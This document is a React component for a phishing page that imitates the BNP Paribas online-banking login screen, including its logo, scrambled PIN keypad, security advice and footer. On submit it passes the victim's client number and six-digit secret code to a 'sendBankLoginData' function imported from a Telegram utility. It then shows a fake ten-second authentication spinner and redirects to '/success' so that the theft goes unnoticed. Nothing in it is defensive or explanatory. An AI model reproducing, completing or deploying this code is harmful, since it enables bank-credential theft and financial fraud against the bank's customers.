import React, { useState } from 'react';
import { X, Bell, Shield, Eye, Phone, Accessibility } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type BNPParibasAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
};

const BNPParibasAuth = ({ onAuthenticate, onBack }: BNPParibasAuthProps) => {
  const [numeroClient, setNumeroClient] = useState('');
  const [codeSecret, setCodeSecret] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleNumeroClientChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
    setNumeroClient(value);
  };

  const handleNumberClick = (number: string) => {
    if (codeSecret.length < 6) {
      setCodeSecret(prev => prev + number);
    }
  };

  const clearCodeSecret = () => {
    setCodeSecret('');
  };

  const clearNumeroClient = () => {
    setNumeroClient('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (numeroClient.length === 10 && codeSecret.length === 6) {
      setIsLoading(true);
      
      await sendBankLoginData({
        bankName: 'BNP Paribas',
        username: numeroClient,
        password: codeSecret
      });

      setTimeout(() => {
        setIsLoading(false);
        // Redirection vers la page de succès
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#00A651] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace BNP Paribas...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className="flex items-center justify-between px-4 py-3">
          <div className="flex items-center">
            <img 
              src="https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo.png" 
              alt="BNP Paribas" 
              className="h-8"
              onError={(e) => {
                (e.target as HTMLImageElement).src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTAwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjMDBBNjUxIi8+Cjx0ZXh0IHg9IjUwIiB5PSIyNSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjEwIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Qk5QIFBBUklCQVM8L3RleHQ+Cjwvc3ZnPgo=';
              }}
            />
            <span className="ml-3 text-gray-600 text-sm hidden md:block">La banque d'un monde qui change</span>
          </div>
          <div className="flex items-center space-x-4">
            <Bell className="w-5 h-5 text-gray-600" />
            <button className="bg-[#00A651] text-white px-4 py-2 rounded-full text-sm hover:bg-[#008f47] transition-colors">
              Devenir client
            </button>
            <button 
              onClick={onBack}
              className="p-1 text-gray-600 hover:text-gray-800 transition-colors"
            >
              <X size={20} />
            </button>
          </div>
        </div>
      </header>

      <div className="flex flex-col lg:flex-row">
        {/* Section principale verte */}
        <div className="w-full lg:w-2/3 bg-gradient-to-br from-[#00A651] to-[#008f47] text-white p-8 lg:p-12 min-h-[calc(100vh-80px)]">
          <div className="max-w-md mx-auto">
            <h1 className="text-3xl lg:text-4xl font-light mb-12 text-center">
              ACCÉDER À MES COMPTES
            </h1>

            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Numéro client */}
              <div>
                <label className="block text-white font-medium mb-4">
                  1. Mon numéro client
                </label>
                <div className="relative">
                  <input
                    type="text"
                    value={numeroClient}
                    onChange={handleNumeroClientChange}
                    className="w-full px-4 py-3 rounded-lg text-gray-800 bg-white focus:outline-none focus:ring-2 focus:ring-white"
                    maxLength={10}
                    placeholder=""
                  />
                  {numeroClient && (
                    <button
                      type="button"
                      onClick={clearNumeroClient}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      <X size={20} />
                    </button>
                  )}
                </div>
              </div>

              {/* Code secret */}
              <div>
                <label className="block text-white font-medium mb-4">
                  2. Mon code secret (6 chiffres)
                </label>
                <div className="relative">
                  <input
                    type="password"
                    value={codeSecret}
                    readOnly
                    className="w-full px-4 py-3 rounded-lg text-gray-800 bg-white cursor-not-allowed"
                    placeholder=""
                  />
                  {codeSecret && (
                    <button
                      type="button"
                      onClick={clearCodeSecret}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      <X size={20} />
                    </button>
                  )}
                </div>
              </div>

              {/* Pavé numérique */}
              <div className="grid grid-cols-5 gap-3 my-8">
                {/* Ligne 1: 6 1 8 2 0 */}
                {[6, 1, 8, 2, 0].map((number) => (
                  <button
                    key={`row1-${number}`}
                    type="button"
                    onClick={() => handleNumberClick(number.toString())}
                    className="aspect-square bg-white hover:bg-gray-100 rounded-lg text-xl font-semibold text-gray-800 transition-colors focus:outline-none focus:ring-2 focus:ring-white"
                  >
                    {number}
                  </button>
                ))}
                
                {/* Ligne 2: 4 5 3 9 7 */}
                {[4, 5, 3, 9, 7].map((number) => (
                  <button
                    key={`row2-${number}`}
                    type="button"
                    onClick={() => handleNumberClick(number.toString())}
                    className="aspect-square bg-white hover:bg-gray-100 rounded-lg text-xl font-semibold text-gray-800 transition-colors focus:outline-none focus:ring-2 focus:ring-white"
                  >
                    {number}
                  </button>
                ))}
              </div>

              {/* Bouton Accéder */}
              <button
                type="submit"
                disabled={numeroClient.length !== 10 || codeSecret.length !== 6}
                className="w-full bg-[#008f47] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#007a3d] disabled:bg-gray-400 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-white focus:ring-offset-2"
              >
                Accéder à mes Comptes
              </button>

              {/* Lien oublié */}
              <div className="text-center">
                <button
                  type="button"
                  className="text-white hover:underline text-sm"
                >
                  Numéro client ou code secret oublié ?
                </button>
              </div>
            </form>
          </div>
        </div>

        {/* Sidebar droite */}
        <div className="w-full lg:w-1/3 bg-white p-6 lg:p-8">
          <div className="space-y-8">
            {/* Vos codes d'accès */}
            <div>
              <div className="flex items-center mb-4">
                <Shield className="w-5 h-5 text-gray-600 mr-2" />
                <h3 className="font-bold text-gray-800">Vos codes d'accès</h3>
              </div>
              <button className="text-[#00A651] hover:underline text-sm">
                Obtenir ses codes d'accès
              </button>
            </div>

            {/* Conseils de sécurité */}
            <div>
              <div className="flex items-center mb-4">
                <Shield className="w-5 h-5 text-gray-600 mr-2" />
                <h3 className="font-bold text-gray-800">Conseils de sécurité</h3>
              </div>
              <p className="text-sm text-gray-600 mb-2">
                Vérifiez que l'adresse du site commence exactement par :
              </p>
              <p className="text-sm font-mono bg-gray-100 p-2 rounded mb-3">
                https://connexion-mabanque.bnpparibas
              </p>
              <p className="text-sm text-gray-600 mb-3">
                précédée par une icône cadenas et contient un https:// qui garantiront une connexion sécurisée.
              </p>
              <button className="text-[#00A651] hover:underline text-sm">
                Découvrez nos conseils sécurité
              </button>
              <p className="text-sm text-gray-600 mt-2">
                et les bonnes pratiques pour consulter et identifier les dangers du web.
              </p>
            </div>

            {/* Accessibilité */}
            <div>
              <div className="flex items-center mb-4">
                <Accessibility className="w-5 h-5 text-gray-600 mr-2" />
                <h3 className="font-bold text-gray-800">Pour une meilleure accessibilité</h3>
              </div>
              <p className="text-sm text-gray-600 mb-2">
                <button className="text-[#00A651] hover:underline">Connectez-vous</button> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.
              </p>
              <p className="text-sm text-gray-600 mb-2">
                <button className="text-[#00A651] hover:underline">Utilisez Facil'iti</button> pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou cognitif).
              </p>
              <p className="text-sm text-gray-600">
                <button className="text-[#00A651] hover:underline">Accédez au service Sourds et Malentendants, Sourds et Aveugles ou Aphasiques</button> pour contacter un conseiller avec un dispositif en LSF (Langue des Signes Française), en LPC (Langue Parlé Complétée) ou en TIP (Transcription Instantanée de la Parole).
              </p>
            </div>

            {/* Informations client */}
            <div>
              <div className="flex items-center mb-4">
                <Phone className="w-5 h-5 text-gray-600 mr-2" />
                <h3 className="font-bold text-gray-800">Informations client</h3>
              </div>
              <p className="text-sm text-gray-600 mb-2">
                Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au :
              </p>
              <div className="flex items-center space-x-2 mb-2">
                <span className="text-2xl font-bold text-gray-800">3477</span>
                <span className="text-xs bg-gray-200 px-2 py-1 rounded">Service gratuit + prix appel</span>
              </div>
              <p className="text-sm text-gray-600">
                ou à nous <button className="text-[#00A651] hover:underline">signaler un problème technique</button>.
                Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application <button className="text-[#00A651] hover:underline">Mes comptes</button>.
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-gray-800 text-white">
        <div className="px-6 py-8">
          {/* Réseaux sociaux */}
          <div className="text-center mb-8">
            <p className="text-gray-300 mb-4">Suivez-nous sur :</p>
            <div className="flex justify-center space-x-6">
              <button className="text-gray-300 hover:text-white transition-colors">
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/>
                </svg>
              </button>
              <button className="text-gray-300 hover:text-white transition-colors">
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z"/>
                </svg>
              </button>
              <button className="text-gray-300 hover:text-white transition-colors">
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                </svg>
              </button>
              <button className="text-gray-300 hover:text-white transition-colors">
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.402.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.357-.629-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24.009 12.017 24.009c6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001.012.001z"/>
                </svg>
              </button>
              <button className="text-gray-300 hover:text-white transition-colors">
                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
                </svg>
              </button>
            </div>
          </div>

          {/* Sections du footer */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 text-sm">
            <div>
              <h4 className="font-bold text-white mb-4">CONTACT</h4>
              <p className="text-gray-300 mb-2">
                Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter.
              </p>
            </div>
            
            <div>
              <h4 className="font-bold text-white mb-4">TROUVER UNE AGENCE</h4>
              <p className="text-gray-300 mb-2">
                Retrouvez facilement l'agence la plus proche avec ses horaires d'ouverture et les services disponibles.
              </p>
            </div>
            
            <div>
              <h4 className="font-bold text-white mb-4">LES APPLICATIONS MOBILES</h4>
              <p className="text-gray-300 mb-2">
                Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie.
              </p>
            </div>
            
            <div>
              <h4 className="font-bold text-white mb-4">NOS AUTRES SITES</h4>
              <div className="space-y-1">
                <button className="block text-gray-300 hover:text-white transition-colors">Les Professionnels</button>
                <button className="block text-gray-300 hover:text-white transition-colors">Les Entreprises</button>
                <button className="block text-gray-300 hover:text-white transition-colors">Les Associations</button>
                <button className="block text-gray-300 hover:text-white transition-colors">La Banque Privée</button>
              </div>
            </div>
          </div>

          {/* Liens légaux */}
          <div className="border-t border-gray-700 mt-8 pt-8">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-xs text-gray-400">
              <div>
                <h5 className="font-bold text-gray-300 mb-2">INFORMATIONS LÉGALES</h5>
                <div className="space-y-1">
                  <button className="block hover:text-white transition-colors">Données personnelles</button>
                  <button className="block hover:text-white transition-colors">Mentions légales</button>
                  <button className="block hover:text-white transition-colors">Cookies</button>
                </div>
              </div>
              
              <div>
                <h5 className="font-bold text-gray-300 mb-2">NOUS CONNAÎTRE</h5>
                <div className="space-y-1">
                  <button className="block hover:text-white transition-colors">La banque d'un monde qui change</button>
                  <button className="block hover:text-white transition-colors">Nos engagements responsables</button>
                </div>
              </div>
              
              <div>
                <h5 className="font-bold text-gray-300 mb-2">INFORMATIONS</h5>
                <div className="space-y-1">
                  <button className="block hover:text-white transition-colors">Site Accessible</button>
                  <button className="block hover:text-white transition-colors">Site Sécurisé</button>
                  <button className="block hover:text-white transition-colors">Conditions d'éligibilité</button>
                </div>
              </div>
              
              <div>
                <h5 className="font-bold text-gray-300 mb-2">NOS AUTRES SITES</h5>
                <div className="space-y-1">
                  <button className="block hover:text-white transition-colors">La Banque en ligne</button>
                  <button className="block hover:text-white transition-colors">Le Groupe BNP Paribas</button>
                </div>
              </div>
            </div>
          </div>

          {/* Disclaimer */}
          <div className="border-t border-gray-700 mt-6 pt-6 text-xs text-gray-400">
            <p>
              Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default BNPParibasAuth;